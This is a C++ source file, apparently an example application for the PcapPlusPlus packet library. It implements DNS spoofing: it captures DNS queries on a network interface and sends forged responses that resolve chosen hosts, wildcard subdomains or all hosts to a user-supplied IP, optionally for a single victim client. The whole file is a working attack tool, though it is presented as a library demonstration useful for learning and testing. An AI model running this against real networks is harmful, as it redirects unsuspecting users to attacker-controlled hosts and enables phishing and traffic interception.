/**
 * DNS spoofing example application
 * ================================
 * This application does simple DNS spoofing. It's provided with interface name or IP and starts capturing DNS requests
 * on that interface. Each DNS request that matches is edited and turned into a DNS response with a user-provided IP
 * address as the resolved IP. Then it's sent back on the network on the same interface
 */

#include <stdexcept>
#include <vector>
#include <iostream>
#include <algorithm>
#include <sstream>
#include <utility>
#include <unordered_map>
#if !defined(_WIN32)
#	include <errno.h>
#endif
#include "IpAddress.h"
#include "RawPacket.h"
#include "ProtocolType.h"
#include "Packet.h"
#include "EthLayer.h"
#include "IPv4Layer.h"
#include "IPv6Layer.h"
#include "UdpLayer.h"
#include "DnsLayer.h"
#include "PcapFilter.h"
#include "PcapLiveDevice.h"
#include "PcapLiveDeviceList.h"
#include "TablePrinter.h"
#include "SystemUtils.h"
#include "PcapPlusPlusVersion.h"
#include <getopt.h>

#define EXIT_WITH_ERROR(reason)                                                                                        \
	do                                                                                                                 \
	{                                                                                                                  \
		printUsage();                                                                                                  \
		std::cout << std::endl << "ERROR: " << reason << std::endl << std::endl;                                       \
		exit(1);                                                                                                       \
	} while (0)

static struct option DnsSpoofingOptions[] = {
	{ "interface",        required_argument, nullptr, 'i' },
	{ "spoof-dns-server", required_argument, nullptr, 'd' },
	{ "client-ip",        required_argument, nullptr, 'c' },
	{ "host-list",        required_argument, nullptr, 'o' },
	{ "help",             no_argument,       nullptr, 'h' },
	{ "version",          no_argument,       nullptr, 'v' },
	{ "list",             no_argument,       nullptr, 'l' },
	{ nullptr,            0,                 nullptr, 0   }
};

/**
 * A struct that holds all counters that are collected during application runtime
 */
struct DnsSpoofStats
{
	int numOfSpoofedDnsRequests;
	std::unordered_map<std::string, int> spoofedHosts;

	DnsSpoofStats() : numOfSpoofedDnsRequests(0)
	{}
};

/**
 * A struct that holds all arguments passed to handleDnsRequest()
 */
struct DnsSpoofingArgs
{
	pcpp::IPAddress dnsServer;
	std::vector<std::string> dnsHostsToSpoof;
	DnsSpoofStats stats;
	bool shouldStop;

	DnsSpoofingArgs() : shouldStop(false)
	{}
};

/**
 * Print application usage
 */
void printUsage()
{
	std::cout
	    << std::endl
	    << "Usage:" << std::endl
	    << "------" << std::endl
	    << pcpp::AppName::get() << " [-hvl] [-o host1,host2,...,host_n] [-c ip_address] -i interface -d ip_address"
	    << std::endl
	    << std::endl
	    << "Options:" << std::endl
	    << std::endl
	    << "    -h                          : Displays this help message and exits" << std::endl
	    << "    -v                          : Displays the current version and exists" << std::endl
	    << "    -l                          : Print the list of available interfaces" << std::endl
	    << "    -i interface                : The interface name or interface IP address to use." << std::endl
	    << "                                  Use the -l switch to see all interfaces" << std::endl
	    << "    -d ip_address               : The IP address of the spoofed DNS server. Supports both IPv4 and IPv6"
	    << std::endl
	    << "                                  (all responses will be sent with this IP address)" << std::endl
	    << "    -c ip_address               : Spoof only DNS requests coming from a specific IP address" << std::endl
	    << "    -o host1,host2,...,host_n   : A comma-separated list of hosts to spoof. If list is not given,"
	    << std::endl
	    << "                                  all hosts will be spoofed. If an host contains '*' all sub-domains"
	    << std::endl
	    << "                                  will be spoofed, for example: if '*.google.com' is given" << std::endl
	    << "                                  then 'mail.google.com', 'tools.google.com', etc. will be spoofed"
	    << std::endl
	    << std::endl;
}

/**
 * Print application version
 */
void printAppVersion()
{
	std::cout << pcpp::AppName::get() << " " << pcpp::getPcapPlusPlusVersionFull() << std::endl
	          << "Built: " << pcpp::getBuildDateTime() << std::endl
	          << "Built from: " << pcpp::getGitInfo() << std::endl;
	exit(0);
}

/**
 * Go over all interfaces and output their names
 */
void listInterfaces()
{
	const std::vector<pcpp::PcapLiveDevice*>& devList =
	    pcpp::PcapLiveDeviceList::getInstance().getPcapLiveDevicesList();

	std::cout << std::endl << "Network interfaces:" << std::endl;
	for (const auto& dev : devList)
	{
		std::cout << "    -> Name: '" << dev->getName() << "'   IP address: " << dev->getIPv4Address().toString()
		          << std::endl;
	}
	exit(0);
}

/**
 * The method that is called each time a DNS request is received. This methods turns the DNS request into a DNS response
 * with the spoofed information and sends it back to the network
 */
void handleDnsRequest(pcpp::RawPacket* packet, pcpp::PcapLiveDevice* dev, void* cookie)
{
	DnsSpoofingArgs* args = (DnsSpoofingArgs*)cookie;

	// create a parsed packet from the raw packet
	pcpp::Packet dnsRequest(packet);

	if (!dnsRequest.isPacketOfType(pcpp::DNS) || !dnsRequest.isPacketOfType(pcpp::IP) ||
	    !dnsRequest.isPacketOfType(pcpp::UDP) || !dnsRequest.isPacketOfType(pcpp::Ethernet))
		return;

	// extract all packet layers
	pcpp::EthLayer* ethLayer = dnsRequest.getLayerOfType<pcpp::EthLayer>();
	pcpp::IPLayer* ipLayer = dnsRequest.getLayerOfType<pcpp::IPLayer>();
	pcpp::UdpLayer* udpLayer = dnsRequest.getLayerOfType<pcpp::UdpLayer>();
	pcpp::DnsLayer* dnsLayer = dnsRequest.getLayerOfType<pcpp::DnsLayer>();

	// skip DNS requests with more than 1 request or with 0 requests
	if (dnsLayer->getDnsHeader()->numberOfQuestions != pcpp::hostToNet16(1) || dnsLayer->getFirstQuery() == nullptr)
		return;

	// skip DNS requests which are not of class IN and type A (IPv4) or AAAA (IPv6)
	pcpp::DnsType dnsType = (args->dnsServer.isIPv4() ? pcpp::DNS_TYPE_A : pcpp::DNS_TYPE_AAAA);
	pcpp::DnsQuery* dnsQuery = dnsLayer->getFirstQuery();
	if (dnsQuery->getDnsType() != dnsType || dnsQuery->getDnsClass() != pcpp::DNS_CLASS_IN)
		return;

	// empty dnsHostsToSpoof means spoofing all hosts
	if (!args->dnsHostsToSpoof.empty())
	{
		bool hostMatch = false;

		// go over all hosts in dnsHostsToSpoof list and see if current query matches one of them
		for (const auto& host : args->dnsHostsToSpoof)
		{
			if (dnsLayer->getQuery(host, false) != nullptr)
			{
				hostMatch = true;
				break;
			}
		}

		if (!hostMatch)
			return;
	}

	// create a response out of the request packet

	// reverse src and dst MAC addresses
	pcpp::MacAddress srcMac = ethLayer->getSourceMac();
	ethLayer->setSourceMac(ethLayer->getDestMac());
	ethLayer->setDestMac(srcMac);

	// reverse src and dst IP addresses
	pcpp::IPAddress srcIP = ipLayer->getSrcIPAddress();
	pcpp::IPv4Layer* ip4Layer = dynamic_cast<pcpp::IPv4Layer*>(ipLayer);
	pcpp::IPv6Layer* ip6Layer = dynamic_cast<pcpp::IPv6Layer*>(ipLayer);
	if (ip4Layer != nullptr)
	{
		ip4Layer->setSrcIPv4Address(ip4Layer->getDstIPv4Address());
		ip4Layer->setDstIPv4Address(srcIP.getIPv4());
		ip4Layer->getIPv4Header()->ipId = 0;
	}
	else if (ip6Layer != nullptr)
	{
		ip6Layer->setSrcIPv6Address(ip6Layer->getDstIPv6Address());
		ip6Layer->setDstIPv6Address(srcIP.getIPv6());
	}
	else
	{
		throw std::logic_error("IPLayer should be either IPv4Layer or IPv6Layer");
	}

	// reverse src and dst UDP ports
	uint16_t srcPort = udpLayer->getUdpHeader()->portSrc;
	udpLayer->getUdpHeader()->portSrc = udpLayer->getUdpHeader()->portDst;
	udpLayer->getUdpHeader()->portDst = srcPort;

	// add DNS response
	dnsLayer->getDnsHeader()->queryOrResponse = 1;
	if (args->dnsServer.isIPv4())
	{
		pcpp::IPv4DnsResourceData dnsServer(args->dnsServer.getIPv4());
		if (!dnsLayer->addAnswer(dnsQuery->getName(), pcpp::DNS_TYPE_A, pcpp::DNS_CLASS_IN, 1, &dnsServer))
			return;
	}
	else
	{
		pcpp::IPv6DnsResourceData dnsServer(args->dnsServer.getIPv6());
		if (!dnsLayer->addAnswer(dnsQuery->getName(), pcpp::DNS_TYPE_AAAA, pcpp::DNS_CLASS_IN, 1, &dnsServer))
			return;
	}

	dnsRequest.computeCalculateFields();

	// send DNS response back to the network
	if (!dev->sendPacket(&dnsRequest))
		return;

	args->stats.numOfSpoofedDnsRequests++;
	args->stats.spoofedHosts[dnsQuery->getName()]++;
}

/**
 * An auxiliary method for sorting the string count map. Used for printing the summary of spoofed hosts
 */
bool stringCountComparer(const std::pair<std::string, int>& first, const std::pair<std::string, int>& second)
{
	if (first.second == second.second)
	{
		return first.first > second.first;
	}
	return first.second > second.second;
}

/**
 * A callback for application interrupted event (ctrl+c): print DNS spoofing summary
 */
void onApplicationInterrupted(void* cookie)
{
	DnsSpoofingArgs* args = (DnsSpoofingArgs*)cookie;
	if (args->stats.spoofedHosts.size() == 0)
	{
		std::cout << std::endl << "Application closing. No hosts were spoofed." << std::endl;
	}
	else
	{
		std::cout << std::endl
		          << "Summary of spoofed hosts:" << std::endl
		          << "-------------------------" << std::endl
		          << std::endl
		          << "Total spoofed:          " << args->stats.numOfSpoofedDnsRequests << std::endl
		          << "Number of host spoofed: " << args->stats.spoofedHosts.size() << std::endl
		          << std::endl;

		// create a table
		std::vector<std::string> columnNames;
		columnNames.push_back("Host");
		columnNames.push_back("# of times spoofed");
		std::vector<int> columnsWidths;
		columnsWidths.push_back(40);
		columnsWidths.push_back(18);
		pcpp::TablePrinter printer(columnNames, columnsWidths);

		// sort the spoofed hosts map so the most spoofed hosts will be first
		// since it's not possible to sort a std::unordered_map you must copy it to a std::vector and sort it then
		std::vector<std::pair<std::string, int>> map2vec(args->stats.spoofedHosts.begin(),
		                                                 args->stats.spoofedHosts.end());
		std::sort(map2vec.begin(), map2vec.end(), &stringCountComparer);

		// go over all items (hosts + count) in the sorted vector and print them
		for (const auto& iter : map2vec)
		{
			std::stringstream values;
			values << iter.first << "|" << iter.second;
			printer.printRow(values.str(), '|');
		}
	}

	args->shouldStop = true;
}

/**
 * Activate DNS spoofing: prepare the device and start capturing DNS requests
 */
void doDnsSpoofing(pcpp::PcapLiveDevice* dev, const pcpp::IPAddress& dnsServer, const pcpp::IPAddress& clientIP,
                   const std::vector<std::string>& dnsHostsToSpoof)
{
	// open device
	if (!dev->open())
		EXIT_WITH_ERROR("Cannot open capture device");

	// set a filter to capture only DNS requests and client IP if provided
	pcpp::PortFilter dnsPortFilter(53, pcpp::DST);

	std::vector<pcpp::GeneralFilter*> filterForAnd;
	filterForAnd.push_back(&dnsPortFilter);

	pcpp::IPFilter clientIpFilter(clientIP.toString(), pcpp::SRC);
	if (!clientIP.isZero())
	{
		filterForAnd.push_back(&clientIpFilter);
	}

	pcpp::AndFilter andFilter(filterForAnd);

	if (!dev->setFilter(andFilter))
		EXIT_WITH_ERROR("Cannot set DNS and client IP filter for device");

	// make args for callback
	DnsSpoofingArgs args;
	args.dnsServer = dnsServer;
	args.dnsHostsToSpoof = dnsHostsToSpoof;

	// start capturing DNS requests
	if (!dev->startCapture(handleDnsRequest, &args))
		EXIT_WITH_ERROR("Cannot start packet capture");

	// register the on app close event to print summary stats on app termination
	pcpp::ApplicationEventHandler::getInstance().onApplicationInterrupted(onApplicationInterrupted, &args);

	// run an endless loop until ctrl+c is pressed
	while (!args.shouldStop)
	{
		std::cout << "Spoofed " << args.stats.numOfSpoofedDnsRequests << " DNS requests so far" << std::endl;
		std::this_thread::sleep_for(std::chrono::seconds(5));
	}
}

/**
 * main method of the application
 */
int main(int argc, char* argv[])
{
	pcpp::AppName::init(argc, argv);

	int optionIndex = 0;
	int opt = 0;

	std::string interfaceNameOrIP;

	pcpp::IPAddress dnsServer;

	pcpp::IPAddress clientIP;
	bool clientIpSet = false;

	std::vector<std::string> hostList;

	while ((opt = getopt_long(argc, argv, "i:d:c:o:hvl", DnsSpoofingOptions, &optionIndex)) != -1)
	{
		switch (opt)
		{
		case 0:
		{
			break;
		}
		case 'h':
		{
			printUsage();
			exit(0);
		}
		case 'v':
		{
			printAppVersion();
			break;
		}
		case 'l':
		{
			listInterfaces();
			exit(0);
		}
		case 'i':
		{
			interfaceNameOrIP = optarg;
			break;
		}
		case 'd':
		{
			try
			{
				dnsServer = pcpp::IPAddress(static_cast<char const*>(optarg));
			}
			catch (const std::exception&)
			{
				EXIT_WITH_ERROR("Spoof DNS server IP provided is empty or not a valid IP address");
			}
			break;
		}
		case 'c':
		{
			try
			{
				clientIP = pcpp::IPAddress(static_cast<char const*>(optarg));
			}
			catch (const std::exception&)
			{
				EXIT_WITH_ERROR("Client IP to spoof is invalid");
			}
			clientIpSet = true;
			break;
		}
		case 'o':
		{
			std::string input = optarg;
			std::istringstream stream(input);
			std::string token;

			while (std::getline(stream, token, ','))
				hostList.push_back(token);
			break;
		}
		default:
		{
			printUsage();
			exit(1);
		}
		}
	}

	pcpp::PcapLiveDevice* dev = nullptr;

	// check if interface argument is IP or name and extract the device
	if (interfaceNameOrIP.empty())
	{
		EXIT_WITH_ERROR("Interface name or IP weren't provided. Please use the -i switch or -h for help");
	}

	dev = pcpp::PcapLiveDeviceList::getInstance().getDeviceByIpOrName(interfaceNameOrIP);
	if (dev == nullptr)
		EXIT_WITH_ERROR("Couldn't find interface by provided IP address or name");

	// verify DNS server IP is a valid IPv4 address
	if (dnsServer.isZero())
		EXIT_WITH_ERROR("Spoof DNS server IP provided is empty or not a valid IPv4 address");

	// verify client IP is valid if set
	if (clientIpSet && clientIP.isZero())
		EXIT_WITH_ERROR("Client IP to spoof is invalid");

	doDnsSpoofing(dev, dnsServer, clientIP, hostList);
}
